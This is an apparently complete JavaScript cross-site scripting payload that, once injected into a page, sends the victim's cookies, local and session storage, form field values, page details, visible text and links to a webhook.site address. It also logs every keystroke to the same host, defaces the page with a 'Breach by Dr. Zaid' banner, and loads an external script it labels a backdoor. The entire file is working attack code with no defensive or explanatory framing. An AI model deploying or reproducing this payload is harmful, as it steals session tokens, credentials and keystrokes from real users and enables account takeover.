(function () {
  const webhookBase = "https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site";

  // 🍪 1. Cookies
  fetch(`${webhookBase}/cookies?c=` + encodeURIComponent(document.cookie));

  // 🧠 2. Storage
  let storageData = [];
  for (let i = 0; i < localStorage.length; i++) {
    let k = localStorage.key(i);
    storageData.push(`LS[${k}]=${localStorage.getItem(k)}`);
  }
  for (let i = 0; i < sessionStorage.length; i++) {
    let k = sessionStorage.key(i);
    storageData.push(`SS[${k}]=${sessionStorage.getItem(k)}`);
  }
  fetch(`${webhookBase}/storage?data=` + encodeURIComponent(storageData.join("&")));

  // 🔍 3. Input Fields
  let fields = document.querySelectorAll("input, textarea, select");
  let inputs = [];
  fields.forEach(el => {
    let name = el.name || el.id || el.className || "unknown";
    inputs.push(`${el.tagName}[${name}] = ${el.value || "(empty)"}`);
  });
  fetch(`${webhookBase}/inputs?data=` + encodeURIComponent(inputs.join("\n")));

  // ⌨️ 4. Keylogger
  document.addEventListener("keydown", e => {
    fetch(`${webhookBase}/keylog?key=${encodeURIComponent(e.key)}`);
  });

  // 🌍 5. Page Info
  let info = {
    location: location.href,
    referrer: document.referrer,
    title: document.title,
    ua: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language
  };
  fetch(`${webhookBase}/pageinfo?info=` + encodeURIComponent(JSON.stringify(info)));

  // 🧭 6. XPath DOM Text Extraction
  let xpathNodes = document.evaluate('//text()[normalize-space()]', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
  let textSnippets = [];
  for (let i = 0; i < xpathNodes.snapshotLength && i < 30; i++) {
    textSnippets.push(xpathNodes.snapshotItem(i).textContent.trim());
  }
  fetch(`${webhookBase}/domtext?data=` + encodeURIComponent(textSnippets.join(" | ")));

  // 🖼️ 7. Images and Links
  let imgs = [...document.querySelectorAll("img")].map(img => img.src);
  let links = [...document.querySelectorAll("a")].map(a => a.href);
  fetch(`${webhookBase}/assets?imgs=` + encodeURIComponent(imgs.join("|")) + "&links=" + encodeURIComponent(links.join("|")));

  // ⚠️ 8. Visual DOM changes
  document.title = "☠️ SYSTEM COMPROMISED - XSS Executed";
  document.body.style.background = "#000";
  document.body.style.color = "#0f0";
  document.body.innerHTML = `<h1>🔥 Breach by Dr. Zaid</h1><p>All data has been extracted.</p><pre>${inputs.slice(0, 5).join("\n")}</pre>`;

  // 🧪 9. Load External JS (Optional Backdoor)
  const ext = document.createElement("script");
  ext.src = "https://cdn.jsdelivr.net/npm/marked/marked.min.js";
  document.head.appendChild(ext);

  // ✅ 10. Final Alert
  alert("✅ Full Advanced XSS Payload Executed");
  console.log("✔️ All modules completed");
})();
